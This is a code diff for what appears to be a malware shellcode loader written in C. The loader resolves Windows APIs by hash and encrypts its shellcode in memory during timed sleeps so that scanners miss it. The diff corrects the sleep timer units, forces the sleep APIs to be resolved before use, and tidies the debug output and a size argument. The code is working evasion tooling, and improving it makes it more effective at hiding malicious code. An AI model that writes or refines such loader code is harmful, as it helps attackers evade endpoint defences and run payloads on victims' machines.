@@ -84,7 +84,7 @@ static inline PPEB GetPeb() {
 #endif
 }
 
-BOOL ensure_sleep_apis() {
+static inline BOOL ensure_sleep_apis() {
     if (!g_ldr->apis->CreateWaitableTimerW)
         g_ldr->apis->CreateWaitableTimerW = (pCreateWaitableTimerW)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEWAITABLETIMERW);
     if (!g_ldr->apis->SetWaitableTimer)
@@ -99,10 +99,11 @@ BOOL ensure_sleep_apis() {
 
 static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) {
     if (time == 0) return;
+    ensure_sleep_apis();
     DBGA("[*] Sleeping for %lu Seconds\n", time);
     DWORD old;
 #ifdef LOCAL
-    DBGA("[*] Encrypting shellcode");
+    DBGA("[*] Encrypting shellcode\n");
     g_ldr->apis->VirtualProtect(Shellcode, ShellcodeSize, PAGE_READWRITE, &old);
     crypt_ecrypt_decrypt((unsigned char*)Shellcode, ShellcodeSize, g_ldr->config->EncryptionKey,
         sizeof(g_ldr->config->EncryptionKey),
@@ -114,12 +115,12 @@ static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) 
     HANDLE hTimer = g_ldr->apis->CreateWaitableTimerW(NULL, TRUE, NULL);
     if (!hTimer) return;
     LARGE_INTEGER li;
-    li.QuadPart = -(LONGLONG)time * 10000; 
+    li.QuadPart = -(LONGLONG)time * 10000000LL;
     g_ldr->apis->SetWaitableTimer(hTimer, &li, 0, NULL, NULL, FALSE);
     g_ldr->apis->WaitForSingleObject(hTimer, INFINITE);
     g_ldr->apis->CloseHandle(hTimer);
 #ifdef LOCAL
-    DBGA("[*] Decrypting shellcode");
+    DBGA("[*] Decrypting shellcode\n");
     crypt_ecrypt_decrypt((unsigned char*)Shellcode, ShellcodeSize, g_ldr->config->EncryptionKey,
         sizeof(g_ldr->config->EncryptionKey),
         g_ldr->config->Nonce,
@@ -130,7 +131,7 @@ static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) 
 }
 
 static inline void ldr_sleep(DWORD time) {
-    do_sleep(time, NULL, NULL);
+    do_sleep(time, NULL, 0);
 }
 
 static inline void ldr_sleep_encrypt_heap(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) {
